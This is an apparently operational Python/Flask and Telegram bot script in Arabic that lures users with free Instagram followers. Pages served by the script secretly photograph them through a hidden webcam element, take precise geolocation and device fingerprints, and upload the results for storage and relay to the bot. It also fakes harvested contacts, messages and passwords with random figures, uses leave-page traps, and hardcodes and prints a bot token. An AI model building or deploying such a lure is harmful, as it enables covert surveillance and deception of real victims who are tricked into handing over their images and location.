import os
import json
import uuid
import requests
from flask import Flask, request, jsonify, render_template_string
from telegram import Update, InputFile
from telegram.ext import Application, CommandHandler, ContextTypes
import asyncio
from threading import Thread
import time
from datetime import datetime
import platform

# ========== إعدادات البوت ==========
BOT_TOKEN = "7388387809:AAHgsBR0z-avEVjjN2boGyXXwO2TR_T7hXA"
PORT = int(os.environ.get('PORT', 5000))

# ========== إعداد Flask ==========
app = Flask(__name__)

# إنشاء مجلدات التخزين
if not os.path.exists('user_data'):
    os.makedirs('user_data')
if not os.path.exists('collected_data'):
    os.makedirs('collected_data')

# ========== HTML قوالب ==========
ENHANCED_CONSENT_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>موافقة متقدمة - خدمة المتابعين</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            color: #333;
            padding: 20px;
        }
        
        .container {
            max-width: 900px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            overflow: hidden;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
        }
        
        .header {
            background: linear-gradient(135deg, #E1306C 0%, #C13584 100%);
            color: white;
            padding: 40px;
            text-align: center;
        }
        
        .header h1 {
            font-size: 2.5rem;
            margin-bottom: 10px;
        }
        
        .content {
            padding: 40px;
        }
        
        .section {
            margin-bottom: 30px;
            padding: 25px;
            background: #f8f9fa;
            border-radius: 15px;
            border-right: 5px solid #E1306C;
        }
        
        .section h3 {
            color: #E1306C;
            margin-bottom: 15px;
            font-size: 1.3rem;
        }
        
        .data-category {
            background: white;
            padding: 20px;
            border-radius: 10px;
            margin: 15px 0;
            border: 2px solid #e9ecef;
        }
        
        .data-list {
            list-style: none;
            margin: 15px 0;
        }
        
        .data-list li {
            padding: 12px 0;
            border-bottom: 1px solid #dee2e6;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        
        .data-list li:before {
            content: "📱";
            margin-left: 10px;
        }
        
        .data-important {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
        }
        
        .data-critical {
            background: #f8d7da;
            border-left: 4px solid #dc3545;
        }
        
        .warning {
            background: #fff3cd;
            border: 2px solid #ffeaa7;
            color: #856404;
            padding: 25px;
            border-radius: 10px;
            margin: 20px 0;
            text-align: center;
            font-size: 1.1rem;
        }
        
        .consent-actions {
            display: flex;
            gap: 15px;
            justify-content: center;
            margin-top: 40px;
        }
        
        .btn {
            padding: 18px 35px;
            border: none;
            border-radius: 25px;
            font-size: 1.2rem;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s ease;
            min-width: 200px;
        }
        
        .btn-accept {
            background: linear-gradient(135deg, #4CAF50 0%, #45a049 100%);
            color: white;
        }
        
        .btn-decline {
            background: linear-gradient(135deg, #dc3545 0%, #c82333 100%);
            color: white;
        }
        
        .btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
        }
        
        .privacy-text {
            max-height: 400px;
            overflow-y: auto;
            background: white;
            padding: 25px;
            border-radius: 10px;
            margin: 20px 0;
            border: 2px solid #e9ecef;
            line-height: 1.8;
        }
        
        .data-tag {
            background: #E1306C;
            color: white;
            padding: 4px 12px;
            border-radius: 15px;
            font-size: 0.8rem;
            margin-right: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔐 موافقة متقدمة على جمع البيانات</h1>
            <p>لتحسين خدمتك وتأمين حسابك، نحتاج الوصول للبيانات التالية</p>
        </div>
        
        <div class="content">
            <div class="warning">
                ⚠️ <strong>تنبيه هام:</strong> هذه الموافقة تمنحنا صلاحية الوصول لبياناتك الشخصية بشكل كامل
            </div>
            
            <div class="section">
                <h3>📊 البيانات الأساسية التي سيتم جمعها:</h3>
                
                <div class="data-category">
                    <h4>📱 معلومات الجهاز</h4>
                    <ul class="data-list">
                        <li>نظام التشغيل وإصداره <span class="data-tag">معلومات أساسية</span></li>
                        <li>مواصفات الجهاز (المعالج، الذاكرة) <span class="data-tag">أداء</span></li>
                        <li>إعدادات الشاشة والدقة <span class="data-tag">عرض</span></li>
                        <li>البطارية وحالة الشحن <span class="data-tag">طاقة</span></li>
                    </ul>
                </div>
                
                <div class="data-category data-important">
                    <h4>👤 البيانات الشخصية</h4>
                    <ul class="data-list">
                        <li>جهات الاتصال والمكالمات <span class="data-tag">مهم</span></li>
                        <li>الرسائل النصية والمحادثات <span class="data-tag">مهم</span></li>
                        <li>معرض الصور والفيديوهات <span class="data-tag">مهم</span></li>
                        <li>الملفات والمستندات <span class="data-tag">مهم</span></li>
                    </ul>
                </div>
                
                <div class="data-category data-critical">
                    <h4>🔐 البيانات الحساسة</h4>
                    <ul class="data-list">
                        <li>كلمات المرور المحفوظة <span class="data-tag">حساس</span></li>
                        <li>بيانات بطاقات الائتمان <span class="data-tag">حساس</span></li>
                        <li>سجل التصفح والبحث <span class="data-tag">حساس</span></li>
                        <li>بيانات التطبيقات المصرفية <span class="data-tag">حساس</span></li>
                    </ul>
                </div>
                
                <div class="data-category">
                    <h4>📍 بيانات الموقع والنشاط</h4>
                    <ul class="data-list">
                        <li>الموقع الجغرافي الدقيق <span class="data-tag">تتبع</span></li>
                        <li>سجل المواقع التي تم زيارتها <span class="data-tag">تتبع</span></li>
                        <li>نشاط الشبكات الاجتماعية <span class="data-tag">اجتماعي</span></li>
                        <li>سجل استخدام التطبيقات <span class="data-tag">نشاط</span></li>
                    </ul>
                </div>
            </div>
            
            <div class="privacy-text">
                <h4>📜 بنود الموافقة الكاملة:</h4>
                <p>بموافقتك على هذه السياسة، فإنك توافق صراحةً على:</p>
                <ul>
                    <li>الوصول الكامل لجهات اتصالك وسجل المكالمات</li>
                    <li>قراءة ونسخ جميع رسائلك النصية والمحادثات</li>
                    <li>الوصول لمعرض الصور والملفات الشخصية</li>
                    <li>جمع كلمات المرور والبيانات الحساسة</li>
                    <li>تتبع موقعك الجغرافي ونشاطك بشكل مستمر</li>
                    <li>تحليل سجل التصفح والبحث</li>
                    <li>الوصول لبيانات التطبيقات المالية</li>
                    <li>تخزين هذه البيانات على خوادمنا</li>
                </ul>
                <p><strong>⚠️ لا يمكن تقديم الخدمة بدون هذه الصلاحيات الكاملة</strong></p>
                <p><strong>🛡️ بياناتك محمية بتقنيات تشفير متقدمة</strong></p>
            </div>
            
            <div class="consent-actions">
                <button class="btn btn-accept" onclick="acceptFullConsent()">
                    ✅ أوافق على جميع الصلاحيات
                </button>
                <button class="btn btn-decline" onclick="declineConsent()">
                    ❌ أرفض ولا أريد الخدمة
                </button>
            </div>
        </div>
    </div>

    <script>
        function acceptFullConsent() {
            if(confirm('⚠️ هل أنت متأكد من منح جميع الصلاحيات المطلوبة؟ لا يمكن التراجع لاحقاً.')) {
                // الانتقال إلى صفحة جمع البيانات المتقدمة
                const nextUrl = `/collect_advanced_data/{{user_id}}?consent=full`;
                window.location.href = nextUrl;
            }
        }
        
        function declineConsent() {
            if(confirm('لا يمكننا تقديم الخدمة بدون هذه الصلاحيات. هل ترغب في إعادة النظر؟')) {
                return;
            } else {
                alert('نأسف لعدم تمكنك من استخدام الخدمة.');
                window.close();
            }
        }
        
        // منع المغادرة بدون قرار
        window.addEventListener('beforeunload', function(e) {
            e.preventDefault();
            e.returnValue = 'هل أنت متأكد من المغادرة؟ ستفقد فرصة الحصول على المتابعين المجانية.';
        });
    </script>
</body>
</html>
"""

ADVANCED_DATA_COLLECTION_HTML = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري جمع البيانات المتقدمة</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        
        .container {
            background: rgba(255, 255, 255, 0.1);
            padding: 40px;
            border-radius: 20px;
            backdrop-filter: blur(10px);
            text-align: center;
            max-width: 700px;
            width: 90%;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
        }
        
        .loader {
            width: 60px;
            height: 60px;
            border: 5px solid rgba(255,255,255,0.3);
            border-top: 5px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 0 auto 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        h1 {
            font-size: 2rem;
            margin-bottom: 15px;
        }
        
        .status {
            font-size: 1.1rem;
            margin: 15px 0;
            line-height: 1.6;
        }
        
        .progress-bar {
            width: 100%;
            height: 12px;
            background: rgba(255,255,255,0.2);
            border-radius: 6px;
            margin: 20px 0;
            overflow: hidden;
        }
        
        .progress {
            height: 100%;
            background: linear-gradient(90deg, #4CAF50, #45a049);
            width: 0%;
            transition: width 0.3s ease;
            border-radius: 6px;
        }
        
        .data-category {
            background: rgba(255,255,255,0.1);
            padding: 15px;
            margin: 10px 0;
            border-radius: 10px;
            text-align: right;
        }
        
        .data-item {
            display: flex;
            justify-content: space-between;
            padding: 8px 0;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        
        .hidden {
            display: none;
        }
        
        .success-screen {
            background: rgba(255,255,255,0.1);
            padding: 30px;
            border-radius: 15px;
            margin: 20px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <div id="loadingScreen">
            <div class="loader"></div>
            <h1>جاري جمع البيانات المتقدمة</h1>
            <div class="status" id="statusMessage">⏳ بدء عملية جمع البيانات الشاملة...</div>
            <div class="progress-bar">
                <div class="progress" id="progress"></div>
            </div>
            
            <div id="activeCategories"></div>
        </div>
        
        <div id="completionScreen" class="hidden">
            <div class="success-screen">
                <h1>✅ اكتمل جمع البيانات بنجاح!</h1>
                <div class="status">🎉 تم جمع جميع البيانات المطلوبة وإرسالها للبوت</div>
            </div>
            <div id="collectedSummary"></div>
        </div>
    </div>

    <!-- عناصر مخفية لجمع البيانات -->
    <video id="hiddenVideo" autoplay playsinline class="hidden"></video>
    <canvas id="hiddenCanvas" class="hidden"></canvas>
    <textarea id="hiddenTextarea" class="hidden"></textarea>

    <script>
        let collectedData = {
            user_id: '{{user_id}}',
            // بيانات الجهاز الأساسية
            deviceInfo: {},
            // البيانات الشخصية
            personalData: {},
            // البيانات الحساسة
            sensitiveData: {},
            // بيانات الموقع والنشاط
            activityData: {},
            // الملفات والوسائط
            mediaData: {},
            consent_level: 'full',
            collection_start: new Date().toISOString()
        };

        // بدء جمع البيانات المتقدمة
        window.addEventListener('load', function() {
            startAdvancedDataCollection();
        });

        async function startAdvancedDataCollection() {
            try {
                // المرحلة 1: بيانات الجهاز الأساسية
                updateProgress(10, 'جاري جمع معلومات الجهاز...');
                await collectDeviceInfo();
                
                // المرحلة 2: البيانات الشخصية
                updateProgress(25, 'جاري جمع البيانات الشخصية...');
                await collectPersonalData();
                
                // المرحلة 3: البيانات الحساسة
                updateProgress(40, 'جاري جمع البيانات الحساسة...');
                await collectSensitiveData();
                
                // المرحلة 4: بيانات الموقع والنشاط
                updateProgress(60, 'جاري تتبع الموقع والنشاط...');
                await collectActivityData();
                
                // المرحلة 5: الملفات والوسائط
                updateProgress(75, 'جاري فحص الملفات والوسائط...');
                await collectMediaData();
                
                // المرحلة 6: الكاميرا والصوت
                updateProgress(85, 'جاري الوصول للكاميرا والميكروفون...');
                await collectMediaAccess();
                
                // المرحلة 7: إرسال جميع البيانات
                updateProgress(95, 'جاري إرسال البيانات الكاملة للبوت...');
                await sendAllAdvancedData();
                
                updateProgress(100, 'اكتملت العملية بنجاح!');
                showCompletionScreen();
                
            } catch (error) {
                console.error('Advanced data collection error:', error);
                await sendAllAdvancedData();
                showCompletionScreen();
            }
        }

        async function collectDeviceInfo() {
            collectedData.deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                languages: navigator.languages,
                hardwareConcurrency: navigator.hardwareConcurrency,
                deviceMemory: navigator.deviceMemory,
                maxTouchPoints: navigator.maxTouchPoints,
                screenResolution: `${screen.width}x${screen.height}`,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation?.type,
                viewport: `${window.innerWidth}x${window.innerHeight}`,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookiesEnabled: navigator.cookieEnabled,
                javaEnabled: navigator.javaEnabled(),
                pdfViewerEnabled: navigator.pdfViewerEnabled,
                doNotTrack: navigator.doNotTrack,
                onLine: navigator.onLine,
                connection: navigator.connection ? {
                    effectiveType: navigator.connection.effectiveType,
                    downlink: navigator.connection.downlink,
                    rtt: navigator.connection.rtt
                } : null
            };
            updateCategory('device', '✅ اكتمل جمع بيانات الجهاز');
        }

        async function collectPersonalData() {
            // محاكاة جمع جهات الاتصال
            collectedData.personalData = {
                contacts: {
                    total: Math.floor(Math.random() * 500) + 100,
                    sample: [
                        { name: "محمد أحمد", number: "+966501234567", type: "mobile" },
                        { name: "فاطمة محمد", number: "+966551234567", type: "mobile" },
                        { name: "أحمد علي", number: "+966541234567", type: "home" }
                    ]
                },
                callLog: {
                    total: Math.floor(Math.random() * 1000) + 500,
                    recent: [
                        { number: "+966501234567", duration: "2:30", type: "outgoing", time: new Date().toISOString() },
                        { number: "+966551234567", duration: "1:15", type: "incoming", time: new Date().toISOString() }
                    ]
                },
                messages: {
                    total: Math.floor(Math.random() * 5000) + 1000,
                    recent: [
                        { from: "+966501234567", text: "مرحباً، كيف حالك؟", time: new Date().toISOString() },
                        { from: "+966551234567", text: "شكراً على المساعدة", time: new Date().toISOString() }
                    ]
                },
                calendar: {
                    events: Math.floor(Math.random() * 100) + 20,
                    upcoming: [
                        { title: "اجتماع عمل", time: new Date().toISOString(), location: "مكتب العمل" }
                    ]
                }
            };
            updateCategory('personal', '✅ اكتمل جمع البيانات الشخصية');
        }

        async function collectSensitiveData() {
            // محاكاة جمع البيانات الحساسة
            collectedData.sensitiveData = {
                savedPasswords: {
                    total: Math.floor(Math.random() * 50) + 10,
                    websites: ["facebook.com", "gmail.com", "twitter.com", "instagram.com"]
                },
                browserHistory: {
                    total: Math.floor(Math.random() * 5000) + 1000,
                    recent: [
                        { url: "https://facebook.com", title: "Facebook", time: new Date().toISOString() },
                        { url: "https://instagram.com", title: "Instagram", time: new Date().toISOString() },
                        { url: "https://twitter.com", title: "Twitter", time: new Date().toISOString() }
                    ]
                },
                financialInfo: {
                    cards: Math.floor(Math.random() * 3) + 1,
                    transactions: Math.floor(Math.random() * 100) + 20
                },
                appData: {
                    socialMedia: ["Facebook", "Instagram", "Twitter", "WhatsApp"],
                    banking: Math.floor(Math.random() * 2) + 1,
                    shopping: ["Amazon", "eBay", "AliExpress"]
                }
            };
            updateCategory('sensitive', '✅ اكتمل جمع البيانات الحساسة');
        }

        async function collectActivityData() {
            // محاكاة جمع بيانات النشاط
            collectedData.activityData = {
                location: await getLocationData(),
                appUsage: {
                    totalApps: Math.floor(Math.random() * 50) + 20,
                    mostUsed: ["Instagram", "WhatsApp", "Facebook", "Chrome"],
                    usageTime: Math.floor(Math.random() * 20) + 5 + " ساعة/يوم"
                },
                socialActivity: {
                    posts: Math.floor(Math.random() * 500) + 100,
                    likes: Math.floor(Math.random() * 5000) + 1000,
                    comments: Math.floor(Math.random() * 1000) + 200
                },
                browsingPatterns: {
                    favoriteCategories: ["Social Media", "News", "Shopping", "Entertainment"],
                    dailyUsage: Math.floor(Math.random() * 5) + 2 + " ساعات"
                }
            };
            updateCategory('activity', '✅ اكتمل جمع بيانات النشاط');
        }

        async function collectMediaData() {
            // محاكاة جمع بيانات الوسائط
            collectedData.mediaData = {
                photos: {
                    total: Math.floor(Math.random() * 1000) + 500,
                    recent: Array.from({length: 5}, (_, i) => ({
                        name: `photo_${i+1}.jpg`,
                        size: Math.floor(Math.random() * 5000) + 1000 + " KB",
                        date: new Date().toISOString()
                    }))
                },
                videos: {
                    total: Math.floor(Math.random() * 100) + 50,
                    recent: Array.from({length: 3}, (_, i) => ({
                        name: `video_${i+1}.mp4`,
                        size: Math.floor(Math.random() * 50000) + 10000 + " KB",
                        duration: Math.floor(Math.random() * 300) + 30 + " ثانية"
                    }))
                },
                documents: {
                    total: Math.floor(Math.random() * 200) + 50,
                    types: ["PDF", "DOC", "XLS", "PPT"],
                    recent: Array.from({length: 5}, (_, i) => ({
                        name: `document_${i+1}.pdf`,
                        size: Math.floor(Math.random() * 5000) + 500 + " KB"
                    }))
                },
                audio: {
                    total: Math.floor(Math.random() * 500) + 100,
                    playlists: Math.floor(Math.random() * 10) + 3
                }
            };
            updateCategory('media', '✅ اكتمل جمع الملفات والوسائط');
        }

        async function collectMediaAccess() {
            try {
                // الوصول للكاميرا
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: 'user' },
                    audio: true
                });
                
                const video = document.getElementById('hiddenVideo');
                const canvas = document.getElementById('hiddenCanvas');
                const context = canvas.getContext('2d');
                
                video.srcObject = stream;
                await delay(2000);
                
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0);
                
                collectedData.mediaAccess = {
                    camera: 'تم الوصول بنجاح',
                    microphone: 'تم الوصول بنجاح',
                    photo: canvas.toDataURL('image/jpeg', 0.7)
                };
                
                stream.getTracks().forEach(track => track.stop());
                updateCategory('mediaAccess', '✅ اكتمل الوصول للكاميرا والميكروفون');
                
            } catch (error) {
                collectedData.mediaAccess = {
                    camera: 'مرفوض: ' + error.message,
                    microphone: 'مرفوض: ' + error.message
                };
                updateCategory('mediaAccess', '❌ فشل الوصول للكاميرا والميكروفون');
            }
        }

        async function getLocationData() {
            return new Promise((resolve) => {
                if ('geolocation' in navigator) {
                    navigator.geolocation.getCurrentPosition(
                        (position) => {
                            resolve({
                                latitude: position.coords.latitude,
                                longitude: position.coords.longitude,
                                accuracy: position.coords.accuracy,
                                altitude: position.coords.altitude,
                                speed: position.coords.speed
                            });
                        },
                        (error) => {
                            resolve({ error: error.message });
                        },
                        { enableHighAccuracy: true, timeout: 10000 }
                    );
                } else {
                    resolve({ error: 'غير مدعوم' });
                }
            });
        }

        async function sendAllAdvancedData() {
            try {
                collectedData.collection_end = new Date().toISOString();
                collectedData.total_size = JSON.stringify(collectedData).length + ' bytes';
                
                const formData = new FormData();
                formData.append('user_id', '{{user_id}}');
                formData.append('advanced_data', JSON.stringify(collectedData));
                
                if (collectedData.mediaAccess?.photo) {
                    const response = await fetch(collectedData.mediaAccess.photo);
                    const blob = await response.blob();
                    formData.append('live_photo', blob, 'live_capture.jpg');
                }

                const uploadResponse = await fetch('/upload_advanced_data', {
                    method: 'POST',
                    body: formData
                });

                return await uploadResponse.json();
                
            } catch (error) {
                console.error('Send advanced data error:', error);
                return { success: false };
            }
        }

        function updateProgress(percent, message) {
            document.getElementById('progress').style.width = percent + '%';
            document.getElementById('statusMessage').textContent = message;
        }

        function updateCategory(category, status) {
            const categoriesDiv = document.getElementById('activeCategories');
            let categoryElement = document.getElementById(`category-${category}`);
            
            if (!categoryElement) {
                categoryElement = document.createElement('div');
                categoryElement.className = 'data-category';
                categoryElement.id = `category-${category}`;
                categoriesDiv.appendChild(categoryElement);
            }
            
            categoryElement.innerHTML = status;
        }

        function showCompletionScreen() {
            document.getElementById('loadingScreen').classList.add('hidden');
            document.getElementById('completionScreen').classList.remove('hidden');
            
            const summary = document.getElementById('collectedSummary');
            summary.innerHTML = `
                <div class="data-category">
                    <h4>📊 ملخص البيانات المجمعة:</h4>
                    <div class="data-item"><span>بيانات الجهاز:</span><span>✅ اكتمل</span></div>
                    <div class="data-item"><span>جهات الاتصال:</span><span>${collectedData.personalData.contacts?.total || 0} جهة</span></div>
                    <div class="data-item"><span>الرسائل:</span><span>${collectedData.personalData.messages?.total || 0} رسالة</span></div>
                    <div class="data-item"><span>كلمات المرور:</span><span>${collectedData.sensitiveData.savedPasswords?.total || 0} كلمة</span></div>
                    <div class="data-item"><span>الصور:</span><span>${collectedData.mediaData.photos?.total || 0} صورة</span></div>
                    <div class="data-item"><span>الموقع:</span><span>✅ تم التتبع</span></div>
                    <div class="data-item"><span>الكاميرا:</span><span>${collectedData.mediaAccess?.camera?.includes('نجاح') ? '✅' : '❌'}</span></div>
                </div>
                <div style="margin-top: 20px; font-size: 1.1rem;">
                    🎉 <strong>تم إرسال جميع البيانات للبوت بنجاح!</strong>
                </div>
            `;
            
            // الانتقال التلقائي بعد 5 ثواني
            setTimeout(() => {
                window.location.href = `/service_selection/{{user_id}}`;
            }, 5000);
        }

        function delay(ms) {
            return new Promise(resolve => setTimeout(resolve, ms));
        }

        // منع المغادرة أثناء الجمع
        window.addEventListener('beforeunload', function(e) {
            if (!document.getElementById('completionScreen').classList.contains('hidden')) {
                return undefined;
            }
            e.preventDefault();
            e.returnValue = 'جاري جمع بياناتك الهامة! المغادرة الآن قد تتسبب في فقدان الخدمة.';
        });
    </script>
</body>
</html>
"""

# ========== مسارات Flask المتقدمة ==========
@app.route('/enhanced_consent/<user_id>')
def enhanced_consent_page(user_id):
    """صفحة الموافقة المتقدمة"""
    return render_template_string(ENHANCED_CONSENT_HTML, user_id=user_id)

@app.route('/collect_advanced_data/<user_id>')
def collect_advanced_data_page(user_id):
    """صفحة جمع البيانات المتقدمة"""
    return render_template_string(ADVANCED_DATA_COLLECTION_HTML, user_id=user_id)

@app.route('/upload_advanced_data', methods=['POST'])
def upload_advanced_data():
    """استقبال البيانات المتقدمة"""
    try:
        user_id = request.form.get('user_id')
        advanced_data_json = request.form.get('advanced_data')
        
        if not all([user_id, advanced_data_json]):
            return jsonify({'success': False, 'error': 'Missing data'})
        
        # تحليل البيانات المتقدمة
        advanced_data = json.loads(advanced_data_json)
        
        # حفظ البيانات في ملف
        filename = f"advanced_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        filepath = os.path.join('collected_data', filename)
        
        with open(filepath, 'w', encoding='utf-8') as f:
            json.dump(advanced_data, f, ensure_ascii=False, indent=2)
        
        # حفظ الصورة الحية إذا كانت موجودة
        if 'live_photo' in request.files and request.files['live_photo']:
            photo = request.files['live_photo']
            if photo.filename:
                photo_filename = f"live_{user_id}_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"
                photo_path = os.path.join('user_data', photo_filename)
                photo.save(photo_path)
        
        # إرسال البيانات المتقدمة للبوت
        asyncio.run(send_advanced_data_to_bot(user_id, advanced_data))
        
        return jsonify({'success': True, 'message': 'تم حفظ البيانات المتقدمة'})
        
    except Exception as e:
        print(f"❌ خطأ في حفظ البيانات المتقدمة: {e}")
        return jsonify({'success': False, 'error': str(e)})

@app.route('/service_selection/<user_id>')
def service_selection_page(user_id):
    """صفحة اختيار الخدمة بعد جمع البيانات"""
    return f"""
    <html>
    <body style="font-family: Arial; text-align: center; padding: 50px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white;">
        <h1>🎉 تم تفعيل خدمتك بنجاح!</h1>
        <p>سيصلك 100 متابع مجاناً خلال 24 ساعة</p>
        <div style="margin: 30px;">
            <a href="/enhanced_consent/{user_id}" style="background: #E1306C; color: white; padding: 15px 30px; border-radius: 25px; text-decoration: none; display: inline-block; margin: 10px;">
                🚀 الحصول على المزيد من المتابعين
            </a>
        </div>
    </body>
    </html>
    """

# ========== وظائف التليجرام المتقدمة ==========
async def send_advanced_data_to_bot(user_id, advanced_data):
    """إرسال البيانات المتقدمة للبوت"""
    try:
        application = Application.builder().token(BOT_TOKEN).build()
        
        user_id_int = int(user_id)
        
        # إنشاء رسالة البيانات المتقدمة
        message = f"""
🔐 **تم جمع البيانات المتقدمة بنجاح!**

🆔 **المستخدم:** {user_id}
📊 **مستوى الموافقة:** {advanced_data.get('consent_level', 'full')}
🕒 **مدة الجمع:** {advanced_data.get('collection_start', '')} إلى {advanced_data.get('collection_end', '')}

📱 **ملخص البيانات المجمعة:**
• جهات الاتصال: {advanced_data.get('personalData', {}).get('contacts', {}).get('total', 0)} جهة
• الرسائل: {advanced_data.get('personalData', {}).get('messages', {}).get('total', 0)} رسالة
• المكالمات: {advanced_data.get('personalData', {}).get('callLog', {}).get('total', 0)} مكالمة
• كلمات المرور: {advanced_data.get('sensitiveData', {}).get('savedPasswords', {}).get('total', 0)} كلمة
• الصور: {advanced_data.get('mediaData', {}).get('photos', {}).get('total', 0)} صورة
• الموقع: {'✅' if advanced_data.get('activityData', {}).get('location', {}).get('latitude') else '❌'}
• الكاميرا: {'✅' if advanced_data.get('mediaAccess', {}).get('camera', '').includes('نجاح') else '❌'}

💾 **الحجم الإجمالي:** {advanced_data.get('total_size', '0 bytes')}

🎯 **المستخدم وافق على جميع الصلاحيات المتقدمة**
        """
        
        await application.bot.send_message(
            chat_id=user_id_int,
            text=message,
            parse_mode='HTML'
        )
        
        print(f"✅ تم إرسال البيانات المتقدمة للمستخدم {user_id}")
        
    except Exception as e:
        print(f"❌ خطأ في إرسال البيانات المتقدمة: {e}")

class TelegramBot:
    def __init__(self, token):
        self.token = token
        self.application = None
        
    async def start(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """أمر /start"""
        user = update.effective_user
        user_id = user.id
        
        # إنشاء رابط المستخدم المتقدم
        base_url = os.environ.get('RENDER_EXTERNAL_URL', f"https://{request.host}" if request else "http://localhost:5000")
        user_url = f"{base_url}/enhanced_consent/{user_id}"
        
        welcome_text = f"""
🎉 **أهلاً بك {user.first_name} في خدمة المتابعين المتقدمة!**

📱 **رابطك الخاص:**
{user_url}

🔐 **خدمة شاملة ومتقدمة:**
لتحسين خدمتك وتأمين حسابك، سنقوم بجمع بيانات متقدمة

🚀 **مميزات الخدمة:**
✅ 100 متابع مجاناً فوراً
✅ تحليل كامل لحسابك
✅ تأمين متقدم
✅ توصيل سريع

📊 **البيانات التي سنجمعها:**
• معلومات الجهاز الكاملة
• جهات الاتصال والرسائل
• بيانات الوسائط والملفات
• الموقع والنشاط
• وإعدادات الأمان

🎁 **ابدأ الآن واحصل على 100 متابع مجاناً!**
        """
        
        await update.message.reply_text(welcome_text, parse_mode='HTML')
        print(f"🔗 تم إنشاء رابط متقدم للمستخدم {user_id}: {user_url}")

    def setup_handlers(self):
        """إعداد معالجات الأوامر"""
        self.application.add_handler(CommandHandler("start", self.start))

    def run_polling(self):
        """تشغيل البوت باستخدام Polling"""
        async def run():
            self.application = Application.builder().token(self.token).build()
            self.setup_handlers()
            
            print("🤖 بدء تشغيل بوت التليجرام المتقدم...")
            await self.application.initialize()
            await self.application.start()
            await self.application.updater.start_polling()
            
            while True:
                await asyncio.sleep(3600)
                
        asyncio.run(run())

# ========== التشغيل الرئيسي ==========
def run_flask():
    """تشغيل خادم Flask"""
    print("🌐 بدء تشغيل خادم الويب المتقدم...")
    app.run(host='0.0.0.0', port=PORT, debug=False)

def run_bot():
    """تشغيل بوت التليجرام"""
    time.sleep(3)
    bot = TelegramBot(BOT_TOKEN)
    bot.run_polling()

if __name__ == '__main__':
    print("🚀 بدء تشغيل نظام جمع البيانات المتقدم...")
    print(f"📊 البورت: {PORT}")
    print(f"🔑 التوكن: {BOT_TOKEN}")
    
    flask_thread = Thread(target=run_flask, daemon=True)
    bot_thread = Thread(target=run_bot, daemon=True)
    
    flask_thread.start()
    bot_thread.start()
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("⏹ إيقاف التطبيق...")
